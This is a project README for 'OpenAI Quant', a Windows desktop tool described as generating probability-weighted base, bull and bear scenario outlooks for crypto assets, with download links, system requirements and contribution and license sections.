<p align="center">
  <img src="assets/logo.png" width="120" alt="Quant logo" />
</p>

# OpenAI Quant

<!-- prettier-ignore -->
[![Release](https://img.shields.io/github/v/release/openai/quant?style=flat&label=release)](https://github.com/openai/quant/releases)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D4?style=flat)](#compatibility)
[![License: MIT](https://img.shields.io/badge/license-MIT-green?style=flat)](LICENSE)

[![Download](https://img.shields.io/badge/Download-Quant_Setup-8b5cf6?style=for-the-badge)](https://github.com/openai/quant/releases)

AI Model for Market Analysis.

Quant provides probabilistic market analysis for major crypto assets. The model generates scenario-based outlooks — base, bull and bear cases — and assigns each scenario a probability, a target range, and a conviction score. Inference runs locally; market data is fetched from public endpoints.

| Model ID | Version | Updated |
| --- | --- | --- |
| --- | --- | --- |
| `quant-1` | 1.0.3 | November 2026 |

## Installation

Download the latest installer from [Releases](https://github.com/openai/quant/releases) and run it.

[![Download](https://img.shields.io/badge/Download-Quant_Setup_v1.0.3-8b5cf6?style=for-the-badge)](https://github.com/openai/quant/releases)

### Compatibility

| Operating System | Supported Versions | Notes |
| --- | --- | --- |
| Windows | 10, 11 | x64 |

## Approach

The model evaluates each asset across three scenarios (base, bull, bear) with a probability and target range for each, plus an aggregate conviction score. Every outlook includes the underlying drivers and reasoning.

## Requirements

Windows 10 or higher. 4 GB RAM. ~250 MB disk. Internet connection for market data.

## Documentation

Model documentation: [docs.md](docs.md). Changelog: [CHANGELOG.md](CHANGELOG.md).

## Contributing

Please share bug reports and feature requests through [GitHub issues](https://github.com/openai/quant/issues). Pull requests are limited to repository collaborators; we do not accept pull requests from non-collaborators.

## Security

For security concerns, follow [SECURITY.md](SECURITY.md).

## License

MIT. See [LICENSE](LICENSE).
